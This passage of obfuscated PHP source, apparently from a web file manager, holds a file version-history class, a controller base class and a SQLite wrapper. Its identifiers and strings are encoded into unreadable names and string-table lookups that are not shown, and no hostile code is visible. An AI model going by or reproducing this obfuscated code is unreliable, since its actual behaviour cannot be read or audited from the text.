($®¸÷½Œ¦[$¡Ñùà…µ[1253]]) { return !0; } write_log(array($¡Ñùà…µ[1254], $®¸÷½Œ¦, $¤Úë‘ÎÚ), $¡Ñùà…µ[1255]); show_json($¡Ñùà…µ[1256] . json_encode($®¸÷½Œ¦[$¡Ñùà…µ[1243]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $ï „¦×È =& $_SERVER[ •ŒÓîÆ]; $·Éò×éù = $GLOBALS[$ï „¦×È[6]][$ï „¦×È[91]]; if ($·Éò×éù[$ï „¦×È[1257]] != 1) { return; } if ($·Éò×éù[$ï „¦×È[1258]] <= 0) { return; } if (isset($_REQUEST[$ï „¦×È[1259]]) && $_REQUEST[$ï „¦×È[1259]] == $ï „¦×È[90]) { return; } Hook::bind($ï „¦×È[1260], $ï „¦×È[1261]); Hook::bind($ï „¦×È[1262], $ï „¦×È[1263]); Hook::bind($ï „¦×È[1264], $ï „¦×È[1265]); Hook::bind($ï „¦×È[1266], $ï „¦×È[1267]); Hook::bind($ï „¦×È[1268], $ï „¦×È[1269]); Hook::bind($ï „¦×È[1270], $ï „¦×È[1271]); } public static function eventBeforeUpload($ØØÉ‘ÚÍ) { if ($ØØÉ‘ÚÍ[3] && $ØØÉ‘ÚÍ[3] != REPEAT_REPLACE) { return; } $§òÅÃ˜ = self::parsePath($ØØÉ‘ÚÍ[0]); if (!$§òÅÃ˜) { return; } self::add($§òÅÃ˜); } public static function eventBeforeEdit($Â”•ù—¯) { $ĞÁ™àÒ = self::parsePath($Â”•ù—¯[0]); if (!$ĞÁ™àÒ) { return; } self::add($ĞÁ™àÒ); } public static function eventBeforeCopyFile($Ü¨¸¾ÔŠ, $©âÖ¯×š, $ŒÂæ÷ƒÎ, $á…íûıÍ, $ËàÀ¯«’, $äœƒàä‹) { $º´ï™õ¥ =& $_SERVER[ •ŒÓîÆ]; if (isset($ŒÂæ÷ƒÎ->_data[$º´ï™õ¥[1196]]) && $ŒÂæ÷ƒÎ->_data[$º´ï™õ¥[1196]]) { return; } $¹£‚Ğº° = $ŒÂæ÷ƒÎ->getPathOuter($á…íûıÍ); $ê¦½ñà¨ = self::parsePath($¹£‚Ğº°); if (!$ê¦½ñà¨) { return; } self::add($ê¦½ñà¨); } public static function eventBeforeRename($ÓÈÔ± ) { $µ»®Ø =& $_SERVER[ •ŒÓîÆ]; $…Ç£‘ê = self::parsePath($ÓÈÔ± [0]); if (!$…Ç£‘ê) { return; } $¦¾Æ¤Šù = self::checkInHistory($…Ç£‘ê); if (!$¦¾Æ¤Šù) { return; } if ($¦¾Æ¤Šù[$µ»®Ø[33]] == $µ»®Ø[216]) { $ÈÌçÀôâ = self::listData($…Ç£‘ê); if ($ÈÌçÀôâ && $ÈÌçÀôâ[$µ»®Ø[424]]) { self::moveHistory($…Ç£‘ê, $ÓÈÔ± [1]); } } else { IO::rename($¦¾Æ¤Šù[$µ»®Ø[86]], $ÓÈÔ± [1]); } } public static function eventBeforeMove($àúÉËòš) { $ÀıÂ±š¹ =& $_SERVER[ •ŒÓîÆ]; $É¼ŞÂ‡Ñ = self::parsePath($àúÉËòš[0]); if (!$É¼ŞÂ‡Ñ) { return; } $¿ÀŒØöŠ = self::parsePath($àúÉËòš[1]); if (!$¿ÀŒØöŠ) { return; } $¢Ö†ö€® = $àúÉËòš[3]; $Ü¹›œß¥ = self::checkInHistory($É¼ŞÂ‡Ñ); if (!$Ü¹›œß¥) { return; } $‚®²ß®° = self::pathHistory($¿ÀŒØöŠ); if ($Ü¹›œß¥[$ÀıÂ±š¹[33]] == $ÀıÂ±š¹[216]) { $ôïĞäí¨ = self::listData($É¼ŞÂ‡Ñ); $…’ãõìË = rtrim($¿ÀŒØöŠ, $ÀıÂ±š¹[8]) . $ÀıÂ±š¹[8] . ($¢Ö†ö€® ? $¢Ö†ö€® : get_path_this($É¼ŞÂ‡Ñ)); $˜­¤ƒ® = self::listData($…’ãõìË); if ($ôïĞäí¨ && $ôïĞäí¨[$ÀıÂ±š¹[424]] && $˜­¤ƒ® && $˜­¤ƒ®[$ÀıÂ±š¹[424]]) { return self::clear($É¼ŞÂ‡Ñ); } if ($ôïĞäí¨ && $ôïĞäí¨[$ÀıÂ±š¹[424]]) { self::moveHistory($É¼ŞÂ‡Ñ, $¢Ö†ö€®, $‚®²ß®°); } } else { IO::move($Ü¹›œß¥[$ÀıÂ±š¹[86]], $‚®²ß®°, !1, $¢Ö†ö€®); self::clearEmptyFolder(IO::pathFather($Ü¹›œß¥[$ÀıÂ±š¹[86]])); } } public static function eventAfterRemove($©Å¢òß, $˜„•Î£õ) { $Ù¾ñ› =& $_SERVER[ •ŒÓîÆ]; if (!$˜„•Î£õ) { return; } $ìÌ„·¯Ö = self::parsePath($©Å¢òß[0]); if (!$ìÌ„·¯Ö) { return; } $÷ä¼ï›­ = self::checkInHistory($ìÌ„·¯Ö); if (!$÷ä¼ï›­) { return; } if ($÷ä¼ï›­[$Ù¾ñ›[33]] == $Ù¾ñ›[216]) { $Ã­ÔˆÎ = self::listData($ìÌ„·¯Ö, !1); if ($Ã­ÔˆÎ && $Ã­ÔˆÎ[$Ù¾ñ›[424]]) { self::clear($ìÌ„·¯Ö, !1); } } else { IO::remove($÷ä¼ï›­[$Ù¾ñ›[86]]); self::clearEmptyFolder(IO::pathFather($÷ä¼ï›­[$Ù¾ñ›[86]])); } } private static function checkInHistory($—©¿ëºï) { $…¾ÄıÊ… = self::pathHistory($—©¿ëºï); if (!IO::exist($…¾ÄıÊ…)) { $…¾ÄıÊ… .= $_SERVER[ •ŒÓîÆ][1272]; } return IO::exist($…¾ÄıÊ…) ? IO::info($…¾ÄıÊ…) : !1; } private static function parsePath($ÑŸ…åÁî) { $ˆø¸…— =& $_SERVER[ •ŒÓîÆ]; if (!$ÑŸ…åÁî) { return !1; } if ($GLOBALS[$ˆø¸…—[1273]]) { return; } $ñ†èü¯… = KodIO::parse($ÑŸ…åÁî); $§¥—ùëÅ = $ñ†èü¯…[$ˆø¸…—[33]]; $ùæ—¹ = !$§¥—ùëÅ || $§¥—ùëÅ == KodIO::KOD_IO || $§¥—ùëÅ == KodIO::KOD_SHARE_ITEM; if (!$ùæ—¹ || !$ñ†èü¯…[$ˆø¸…—[1274]]) { return !1; } if (substr($ÑŸ…åÁî, 0, strlen(DATA_PATH . $ˆø¸…—[1275])) == DATA_PATH . $ˆø¸…—[1275]) { return !1; } if ($§¥—ùëÅ == KodIO::KOD_SHARE_ITEM) { $´×Ûü« = IO::init($ÑŸ…åÁî); if ($´×Ûü«->pathParse[$ˆø¸…—[1192]]) { return self::parsePath($´×Ûü«->pathParse[$ˆø¸…—[1192]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $¦ö’ıçÒ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $ˆø¸…—[1276]); foreach ($¦ö’ıçÒ as $È¦ñŸŠ) { if (!$§¥—ùëÅ && substr($ÑŸ…åÁî, 0, strlen($È¦ñŸŠ)) == $È¦ñŸŠ) { return !1; } } self::log($GLOBALS[$ˆø¸…—[1187]] . $ˆø¸…—[1277] . $ÑŸ…åÁî); return $ÑŸ…åÁî; } private static function pathHistory($ÓÔÍæ‚²) { $Œ¡±½°à =& $_SERVER[ •ŒÓîÆ]; $ãĞë¿ñ = self::$_historyBase . ltrim(KodIO::clear($ÓÔÍæ‚²), $Œ¡±½°à[8]); $ãĞë¿ñ = str_replace(array($Œ¡±½°à[1278]), array($Œ¡±½°à[1279]), $ãĞë¿ñ); return $ãĞë¿ñ; } public static function log($¹Õ¦Ş„ª) { } public static function historyCount($…áï¨ã) { $¡Ö€ä =& $_SERVER[ •ŒÓîÆ]; $ş™äÆÂÅ = array(); $éÕ™ĞŠ¯ = array(); foreach ($…áï¨ã as $¥ğÑÂØÒ) { $æ©ïı = get_path_father($¥ğÑÂØÒ); if (!$éÕ™ĞŠ¯[$æ©ïı]) { $éÕ™ĞŠ¯[$æ©ïı] = array(); } $éÕ™ĞŠ¯[$æ©ïı][] = get_path_this($¥ğÑÂØÒ); } foreach ($éÕ™ĞŠ¯ as $æ©ïı => $Ô¡ÈÆÁ) { $ºË’§—’ = self::parsePath($æ©ïı); if (!$ºË’§—’) { continue; } foreach ($Ô¡ÈÆÁ as $¬œ¾…š) { $÷¥€ï£” = self::listData(rtrim($ºË’§—’, $¡Ö€ä[8]) . $¡Ö€ä[8] . $¬œ¾…š, !1); if ($÷¥€ï£” && $÷¥€ï£”[$¡Ö€ä[424]]) { $ş™äÆÂÅ[rtrim($æ©ïı, $¡Ö€ä[8]) . $¡Ö€ä[8] . $¬œ¾…š] = count($÷¥€ï£”[$¡Ö€ä[424]]); } } } return $ş™äÆÂÅ; } public static function add($…©¿Š) { $Ôë÷½® =& $_SERVER[ •ŒÓîÆ]; $×¦­È¼… = self::listData($…©¿Š); if (!$×¦­È¼…) { return; } $ÑğšÔÖ« = Model($Ôë÷½®[811])->get($Ôë÷½®[1280]); $Ğ¯Ğ¬âŠ = intval($GLOBALS[$Ôë÷½®[6]][$Ôë÷½®[91]][$Ôë÷½®[1258]]); $áÕ‡•â = $ÑğšÔÖ« == $Ôë÷½®[1281] ? min(5, $Ğ¯Ğ¬âŠ) : $Ğ¯Ğ¬âŠ; if ($Ğ¯Ğ¬âŠ <= 0) { return; } $ùêÎÚÌ« = IO::info($…©¿Š); $òØı³Ë = $×¦­È¼…[$Ôë÷½®[424]]; if ($ùêÎÚÌ«[$Ôë÷½®[78]] == 0) { return; } if ($ùêÎÚÌ«[$Ôë÷½®[78]] >= 1024 * 1024 * 500) { return !1; } $ÇÁôİ  = IO::hashSimple($…©¿Š); if ($òØı³Ë && $òØı³Ë[0][$Ôë÷½®[652]] == $ÇÁôİ ) { return !0; } if (array_key_exists($Ôë÷½®[219], $ùêÎÚÌ«) && !$ùêÎÚÌ«[$Ôë÷½®[219]]) { return !1; } $’Õ§ú–¦ = short_id(time()); $¯Åò­©ø = array($Ôë÷½®[453] => $’Õ§ú–¦, $Ôë÷½®[652] => $ÇÁôİ , $Ôë÷½®[32] => $ùêÎÚÌ«[$Ôë÷½®[32]] . $Ôë÷½®[10] . date($Ôë÷½®[1282]) . rand_string(1), $Ôë÷½®[78] => $ùêÎÚÌ«[$Ôë÷½®[78]], $Ôë÷½®[506] => USER_ID, $Ôë÷½®[217] => time(), $Ôë÷½®[1283] => $Ôë÷½®[12]); IO::mkdir($×¦­È¼…[$Ôë÷½®[1284]]); $Í¾¾Øñ = IO::copy($…©¿Š, $×¦­È¼…[$Ôë÷½®[1284]], !1, $¯Åò­©ø[$Ôë÷½®[32]]); if (!$Í¾¾Øñ) { self::clearEmptyFolder($×¦­È¼…[$Ôë÷½®[1284]]); return !1; } array_unshift($òØı³Ë, $¯Åò­©ø); if (count($òØı³Ë) > $áÕ‡•â) { $¤ÍéÇÆ = array_slice($òØı³Ë, $áÕ‡•â); foreach ($¤ÍéÇÆ as $„ğ¨ä) { IO::remove($×¦­È¼…[$Ôë÷½®[1284]] . $„ğ¨ä[$Ôë÷½®[32]]); } $òØı³Ë = array_slice($òØı³Ë, 0, $áÕ‡•â); } return self::saveData($×¦­È¼…[$Ôë÷½®[1285]], $òØı³Ë); } public static function remove($œšıæ§¥, $ •¿ŞÜÈ) { $ˆÜ½ËÀë =& $_SERVER[ •ŒÓîÆ]; $‹”ŠÓª¤ = self::listData($œšıæ§¥); $Áé»ß‘¡ = array(); if (!$‹”ŠÓª¤) { return !1; } foreach ($‹”ŠÓª¤[$ˆÜ½ËÀë[424]] as $«·ÀÒ…) { if ($«·ÀÒ…[$ˆÜ½ËÀë[453]] == $ •¿ŞÜÈ) { IO::remove($‹”ŠÓª¤[$ˆÜ½ËÀë[1284]] . $«·ÀÒ…[$ˆÜ½ËÀë[32]]); continue; } $Áé»ß‘¡[] = $«·ÀÒ…; } return self::saveData($‹”ŠÓª¤[$ˆÜ½ËÀë[1285]], $Áé»ß‘¡); } public static function clear($íš”¸á„, $¶ÒØ©¯ı = true) { $‚‚×ışê =& $_SERVER[ •ŒÓîÆ]; $Íú’İ°ñ = self::listData($íš”¸á„, $¶ÒØ©¯ı); if (!$Íú’İ°ñ) { return !1; } foreach ($Íú’İ°ñ[$‚‚×ışê[424]] as $¦şé¨) { IO::remove($Íú’İ°ñ[$‚‚×ışê[1284]] . $¦şé¨[$‚‚×ışê[32]]); } return self::saveData($Íú’İ°ñ[$‚‚×ışê[1285]], array()); } public static function moveHistory($ëúÅ”Ôõ, $¥ø¸ì”ö = '', $ÏĞÍÅ½ = '') { $Ö©¬¸ÓÀ =& $_SERVER[ •ŒÓîÆ]; $Èà·Áö³ = self::listData($ëúÅ”Ôõ, !1); if (!$Èà·Áö³ || !$Èà·Áö³[$Ö©¬¸ÓÀ[424]]) { return !1; } $Î‚€íºÎ = $Ö©¬¸ÓÀ[1272]; $¥ø¸ì”ö = $¥ø¸ì”ö ? $¥ø¸ì”ö : get_path_this($ëúÅ”Ôõ); $ÏĞÍÅ½ = $ÏĞÍÅ½ ? $ÏĞÍÅ½ : $Èà·Áö³[$Ö©¬¸ÓÀ[1284]]; $ºÒŞóÇà = substr(get_path_this($Èà·Áö³[$Ö©¬¸ÓÀ[1285]]), 0, -strlen($Î‚€íºÎ)); foreach ($Èà·Áö³[$Ö©¬¸ÓÀ[424]] as $“‰¸² ± => $ÅÀ¨†¾¡) { $àµã¯â = $¥ø¸ì”ö . substr($ÅÀ¨†¾¡[$Ö©¬¸ÓÀ[32]], strlen($ºÒŞóÇà)); $ÇÌÊª² = IO::move($Èà·Áö³[$Ö©¬¸ÓÀ[1284]] . $ÅÀ¨†¾¡[$Ö©¬¸ÓÀ[32]], $ÏĞÍÅ½, !1, $àµã¯â); if ($ÇÌÊª²) { $Èà·Áö³[$Ö©¬¸ÓÀ[424]][$“‰¸² ±][$Ö©¬¸ÓÀ[32]] = $àµã¯â; } } $Èà·Áö³[$Ö©¬¸ÓÀ[1285]] = IO::move($Èà·Áö³[$Ö©¬¸ÓÀ[1285]], $ÏĞÍÅ½, !1, $¥ø¸ì”ö . $Î‚€íºÎ); self::saveData($Èà·Áö³[$Ö©¬¸ÓÀ[1285]], $Èà·Áö³[$Ö©¬¸ÓÀ[424]]); self::clearEmptyFolder($Èà·Áö³[$Ö©¬¸ÓÀ[1284]]); } public static function rollback($ˆ¡¹ş™, $‚”÷ìõ) { $™¯ÉÓİ„ =& $_SERVER[ •ŒÓîÆ]; $ÒÖñÒ¬¾ = self::listData($ˆ¡¹ş™); if (!$ÒÖñÒ¬¾) { return; } $§ñÈöµ€ = IO::info($ˆ¡¹ş™); foreach ($ÒÖñÒ¬¾[$™¯ÉÓİ„[424]] as $¬ÚÕ†³´ => $ªÍÈ¹ÌÏ) { if ($ªÍÈ¹ÌÏ[$™¯ÉÓİ„[453]] == $‚”÷ìõ) { self::add($ˆ¡¹ş™); $˜ÙØì°Æ = $ÒÖñÒ¬¾[$™¯ÉÓİ„[1284]] . $ªÍÈ¹ÌÏ[$™¯ÉÓİ„[32]]; $¤–§£«û = IO::copy($˜ÙØì°Æ, IO::pathFather($ˆ¡¹ş™), REPEAT_REPLACE, $§ñÈöµ€[$™¯ÉÓİ„[32]]); if ($¤–§£«û) { self::remove($ˆ¡¹ş™, $‚”÷ìõ); } return $¤–§£«û; } } return !1; } public static function setDetail($ñíŒšõÖ, $†íƒ¬Ù¬, $÷…¨¡¬) { $õ÷á½«Ñ =& $_SERVER[ •ŒÓîÆ]; $½ÉàæéÇ = self::listData($ñíŒšõÖ); if (!$½ÉàæéÇ) { return; } foreach ($½ÉàæéÇ[$õ÷á½«Ñ[424]] as $óæ®­ı => $ö»†ˆ•) { if ($ö»†ˆ•[$õ÷á½«Ñ[453]] == $†íƒ¬Ù¬) { $½ÉàæéÇ[$õ÷á½«Ñ[424]][$óæ®­ı][$õ÷á½«Ñ[1283]] = $÷…¨¡¬; self::saveData($½ÉàæéÇ[$õ÷á½«Ñ[1285]], $½ÉàæéÇ[$õ÷á½«Ñ[424]]); return !0; } } return !1; } public static function fileInfo($ÙÌÕş­, $¥£ËÑÅ®) { $½èÖœ²§ =& $_SERVER[ •ŒÓîÆ]; $ïƒıö¡… = self::listData($ÙÌÕş­); if (!$ïƒıö¡…) { show_json(LNG($½èÖœ²§[107]), !1); } $÷øÍùœÄ = $½èÖœ²§[12]; foreach ($ïƒıö¡…[$½èÖœ²§[424]] as $æÕ®Óè => $ôİğ•Ç) { if ($ôİğ•Ç[$½èÖœ²§[453]] != $¥£ËÑÅ®) { continue; } $÷øÍùœÄ = $ïƒıö¡…[$½èÖœ²§[1284]] . $ôİğ•Ç[$½èÖœ²§[32]]; break; } if (!$÷øÍùœÄ) { show_json(LNG($½èÖœ²§[107]), !1); } return IO::info($÷øÍùœÄ); } public static function fileOut($şÃÊ¡€, $†Åõò£§, $×ú­ƒ® = false) { $°ëçôã® =& $_SERVER[ •ŒÓîÆ]; $¼§¢¶ğ‹ = self::fileInfo($şÃÊ¡€, $†Åõò£§); $ ßƒùÔ =& $GLOBALS[$°ëçôã®[7]]; $×ú­ƒ® = isset($ ßƒùÔ[$°ëçôã®[1235]]) && $ ßƒùÔ[$°ëçôã®[1235]] == 1; if (isset($ ßƒùÔ[$°ëçôã®[33]]) && $ ßƒùÔ[$°ëçôã®[33]] == $°ëçôã®[1286]) { return IO::fileOutImage($¼§¢¶ğ‹[$°ëçôã®[86]], $ ßƒùÔ[$°ëçôã®[1287]]); } IO::fileOut($¼§¢¶ğ‹[$°ëçôã®[86]], $×ú­ƒ®, get_path_this($şÃÊ¡€)); } public static function listData($³‡Ğ¬±İ, $ô‘ÆœšÔ = true) { $œ—‘Èï‹ =& $_SERVER[ •ŒÓîÆ]; if ($ô‘ÆœšÔ && !IO::exist($³‡Ğ¬±İ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($³‡Ğ¬±İ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $“üÚ¢ƒ = self::pathHistory($³‡Ğ¬±İ); $»‡í¨£ª = array($œ—‘Èï‹[1285] => $“üÚ¢ƒ . $œ—‘Èï‹[1272], $œ—‘Èï‹[1284] => rtrim(get_path_father($“üÚ¢ƒ), $œ—‘Èï‹[8]) . $œ—‘Èï‹[8], $œ—‘Èï‹[424] => array()); $ğ–î¢¤¢ = IO::getContent($»‡í¨£ª[$œ—‘Èï‹[1285]]); if ($ğ–î¢¤¢) { $”±ğª½ô = json_decode($ğ–î¢¤¢, !0); if (is_array($”±ğª½ô)) { $»‡í¨£ª[$œ—‘Èï‹[424]] = $”±ğª½ô; } } return $»‡í¨£ª; } private static function saveData($––ï±ß½, $ØÚä‹‘„) { $ïƒ«›Šñ =& $_SERVER[ •ŒÓîÆ]; self::log($ïƒ«›Šñ[1288] . $––ï±ß½ . $ïƒ«›Šñ[73] . count($ØÚä‹‘„), $ïƒ«›Šñ[792]); if ($ØÚä‹‘„) { return IO::setContent($––ï±ß½, json_encode($ØÚä‹‘„)); } $—øÊ”– = IO::pathFather($––ï±ß½); IO::remove($––ï±ß½); self::clearEmptyFolder($—øÊ”–); return !0; } public static function clearEmptyFolder($Öâ³‘ºä) { $¨ÜÊÊ© =& $_SERVER[ •ŒÓîÆ]; if (trim($Öâ³‘ºä, $¨ÜÊÊ©[8]) == trim(self::$_historyBase, $¨ÜÊÊ©[8])) { return; } $×äòœ¯ô = IO::pathFather($Öâ³‘ºä); $‘÷’²Ññ = IO::has($Öâ³‘ºä, !0); if ($‘÷’²Ññ[$¨ÜÊÊ©[225]] > 0 || $‘÷’²Ññ[$¨ÜÊÊ©[226]] > 0) { return; } IO::remove($Öâ³‘ºä); self::clearEmptyFolder($×äòœ¯ô); } private static function getBasePath() { $œßÙÅš =& $_SERVER[ •ŒÓîÆ]; $­îÄÅ½ = Model($œßÙÅš[1289])->get($œßÙÅš[1290]); if ($­îÄÅ½) { if (!IO::exist($­îÄÅ½)) { IO::mkdir($­îÄÅ½); } if (get_path_this($­îÄÅ½) == $œßÙÅš[1275]) { $³‡±¼Í¾ = $œßÙÅš[1291] . rand_string(8); @rename($­îÄÅ½, get_path_father($­îÄÅ½) . $œßÙÅš[8] . $³‡±¼Í¾); $­îÄÅ½ = DATA_PATH . $³‡±¼Í¾ . $œßÙÅš[8]; file_put_contents(DATA_PATH . $œßÙÅš[1225], $œßÙÅš[12]); Model($œßÙÅš[1289])->set($œßÙÅš[1290], $­îÄÅ½); } return $­îÄÅ½; } $­îÄÅ½ = DATA_PATH . $œßÙÅš[1291] . rand_string(8) . $œßÙÅš[8]; $­îÄÅ½ = IO::mkdir($­îÄÅ½); $­îÄÅ½ = rtrim($­îÄÅ½, $œßÙÅš[8]) . $œßÙÅš[8]; file_put_contents($­îÄÅ½ . $œßÙÅš[1225], $œßÙÅš[12]); file_put_contents(DATA_PATH . $œßÙÅš[1225], $œßÙÅš[12]); Model($œßÙÅš[1289])->set($œßÙÅš[1290], $­îÄÅ½); return $­îÄÅ½; } } goto aï‰ï‰‚Ò‹; a‚š¸—°Û: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ÛÌÕ€÷Æ =& $_SERVER[ •ŒÓîÆ]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ÛÌÕ€÷Æ[6]] =& $config; $this->values[$ÛÌÕ€÷Æ[7]] =& $in; $this->tpl = TEMPLATE . MOD . $ÛÌÕ€÷Æ[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($ƒô«š…ª) { if (1 === func_num_args()) { $this->{$ƒô«š…ª} = new $ƒô«š…ª(); } else { $¶‹œò¶Å = new ReflectionClass($ƒô«š…ª); $¹åÄßĞé = func_get_args(); array_shift($¹åÄßĞé); $this->{$ƒô«š…ª} = $¶‹œò¶Å->newInstanceArgs($¹åÄßĞé); } return $this->{$ƒô«š…ª}; } public function routeBind($ää‘ÙöÃ, $®Æªì°¨, $¨Ğõ»ó« = 3) { $–Ú°–ûØ =& $_SERVER[ •ŒÓîÆ]; $ÚÀ®´¼‘ = $this->in[$–Ú°–ûØ[9]]; $ää‘ÙöÃ = str_replace($–Ú°–ûØ[10], $–Ú°–ûØ[11], trim(trim($ää‘ÙöÃ, $–Ú°–ûØ[8]), $–Ú°–ûØ[12])); if (!$ää‘ÙöÃ || count($ÚÀ®´¼‘) <= $¨Ğõ»ó«) { return !1; } $şÊ­®Æ¡ = !0; $—º­º˜‚ = explode($–Ú°–ûØ[8], $ää‘ÙöÃ); for ($¿ì©Óç¢ = 0; $¿ì©Óç¢ < count($—º­º˜‚); $¿ì©Óç¢++) { if ($—º­º˜‚[$¿ì©Óç¢] != $ÚÀ®´¼‘[$¨Ğõ»ó« + $¿ì©Óç¢]) { $şÊ­®Æ¡ = !1; break; } } if (!$şÊ­®Æ¡) { return; } call_user_func_array(array($this, $®Æªì°¨), array()); } public function routeArgs($ş¾Ï¶ = 3) { $®•˜ó³ş = $this->in[$_SERVER[ •ŒÓîÆ][9]]; if (count($®•˜ó³ş) <= $ş¾Ï¶) { return array(); } $÷ãÇ½¨¢ = array(); for ($±ºùãŸ¨ = $ş¾Ï¶; $±ºùãŸ¨ < count($®•˜ó³ş); $±ºùãŸ¨ += 2) { $÷ãÇ½¨¢[$®•˜ó³ş[$±ºùãŸ¨]] = $®•˜ó³ş[$±ºùãŸ¨ + 1]; $this->in[$®•˜ó³ş[$±ºùãŸ¨]] = $®•˜ó³ş[$±ºùãŸ¨ + 1]; } return $÷ãÇ½¨¢; } protected function assign($Ğ¶‘ğ¢¶, $”‹İ”¥Ş) { $this->values[$Ğ¶‘ğ¢¶] = $”‹İ”¥Ş; } protected function display($ò™Ä„Ôï) { ob_end_clean(); extract($this->values); require $this->tpl . $ò™Ä„Ôï; } } class DbSqliteBase extends Db { public function __construct($å¢¢¿Åå = '') { $“Ä¢×î =& $_SERVER[ •ŒÓîÆ]; if (!extension_loaded($“Ä¢×î[13])) { think_exception(think_lang($“Ä¢×î[14]) . $“Ä¢×î[15]); } if (!empty($å¢¢¿Åå)) { if (!isset($å¢¢¿Åå[$“Ä¢×î[16]])) { $å¢¢¿Åå[$“Ä¢×î[16]] = 438; } $this->config = $å¢¢¿Åå; if (empty($this->config[$“Ä¢×î[17]])) { $this->config[$“Ä¢×î[17]] = array(); } } } public function connect($ÏŠÙã“· = '', $†ÉÍİ€ê = 0) { $ú‘“³Ï· =& $_SERVER[ •ŒÓîÆ]; if (!isset($this->linkID[$†ÉÍİ€ê])) { if (empty($ÏŠÙã“·)) { $ÏŠÙã“· = $this->config; } $Ş¸‹‡‰Ş = !empty($ÏŠÙã“·[$ú‘“³Ï·[17]][$ú‘“³Ï·[18]]) ? $ÏŠÙã“·[$ú‘“³Ï·[17]][$ú‘“³Ï·[18]] : $this->pconnect; $”ª»ÔÜÎ = $Ş¸‹‡‰Ş ? $ú‘“³Ï·[19] : $ú‘“³Ï·[20]; $this->linkID[$†ÉÍİ€ê] = $”ª»ÔÜÎ($ÏŠÙã“·[$ú‘“³Ï·[21]], $ÏŠÙã“·[$ú‘“³Ï·[16]]); if (!$this->linkID[$†ÉÍİ€ê]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$†ÉÍİ€ê], 30000); if (1 != think_config($ú‘“³Ï·[22])) { unset($this->config); } } return $this->linkID[$†ÉÍİ€ê]; } public function free() { $this->queryID = null; } public function query($šâæş„™) { $Õí² ‡é =& $_SERVER[ •ŒÓîÆ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $šâæş„™; if ($this->queryID) { $this->free(); } think_action_status($Õí² ‡é[23], 1); think_status($Õí² ‡é[24]); $this->queryID = sqlite_query($this->_linkID, $šâæş„™); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $ÍìÇÊ § = $this->getAll(); return $ÍìÇÊ §; } } public function execute($Ù‰çô€ ) { $à†•ş‚ =& $_SERVER[ •ŒÓîÆ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ù‰çô€ ; if ($this->queryID) { $this->free(); } think_action_status($à†•ş‚[25], 1); think_status($à†•ş‚[24]); $§ŒÓü·˜ = sqlite_exec($this->_linkID, $Ù‰çô€ ); $this->debug(); if (!1 === $§ŒÓü·˜) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ •ŒÓîÆ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÜÓëşí‹ = sqlite_query($this->_linkID, $_SERVER[ •ŒÓîÆ][27]); if (!$ÜÓëşí‹) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ˆè¶íË = sqlite_query($this->_linkID, $_SERVER[ •ŒÓîÆ][28]); if (!$ˆè¶íË) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $øµË²î€ = array(); if ($this->numRows > 0) { for ($¦†ëÅË¡ = 0; $¦†ëÅË¡ < $this->numRows; $¦†ëÅË¡++) { $øµË²î€[$¦†ëÅË¡] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $øµË²î€; } public function getFields($—ü§³±) { $ÓèÌÇÕı =& $_SERVER[ •ŒÓîÆ]; $‡İÍ€¡œ = $this->query($ÓèÌÇÕı[29] . $—ü§³± . $ÓèÌÇÕı[30]); $ıäŞ“Î = array(); if ($‡İÍ€¡œ) { foreach ($‡İÍ€¡œ as $°›Â½ğÓ => $œ…²¾®µ) { $ıäŞ“Î[$œ…²¾®µ[$ÓèÌÇÕı[31]]] = array($ÓèÌÇÕı[32] => $œ…²¾®µ[$ÓèÌÇÕı[31]], $ÓèÌÇÕı[33] => $œ…²¾®µ[$ÓèÌÇÕı[34]], $ÓèÌÇÕı[35] => (bool) ($œ…²¾®µ[$ÓèÌÇÕı[36]] === $ÓèÌÇÕı[12]), $ÓèÌÇÕı[37] => $œ…²¾®µ[$ÓèÌÇÕı[38]], $ÓèÌÇÕı[39] => strtolower($œ…²¾®µ[$ÓèÌÇÕı[40]]) == $ÓèÌÇÕı[41], $ÓèÌÇÕı[42] => strtolower($œ…²¾®µ[$ÓèÌÇÕı[43]]) == $ÓèÌÇÕı[44]); } } return $ıäŞ“Î; } public function getTables($îë»§âÖ = '') { $İ·úÎ€Ñ =& $_SERVER[ •ŒÓîÆ]; $‘É³œü‚ = $this->query($İ·úÎ€Ñ[45] . $İ·úÎ€Ñ[46] . $İ·úÎ€Ñ[47]); $ÕôôÚ¤– = array(); foreach ($‘É³œü‚ as $Ø»öÏ‡Ö => $ºà’µ­¬) { $ÕôôÚ¤–[$Ø»öÏ‡Ö] = current($ºà’µ­¬); } return $ÕôôÚ¤–; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $£İÊœ‹œ =& $_SERVER[ •ŒÓîÆ]; $ºÔèõÔ = sqlite_last_error($this->_linkID); $this->error = $ºÔèõÔ . $£İÊœ‹œ[4] . sqlite_error_string($ºÔèõÔ); if ($£İÊœ‹œ[12] != $this->queryStr) { $this->error .= LNG($£İÊœ‹œ[48]) . $this->queryStr; } think_trace($this->error, $£İÊœ‹œ[12], $£İÊœ‹œ[49]); return $this->error; } public function escapeString($£æ…ø‚) { return sqlite_escape_string($£æ…ø‚); } public function parseLimit($ƒ‰º×Œ) { 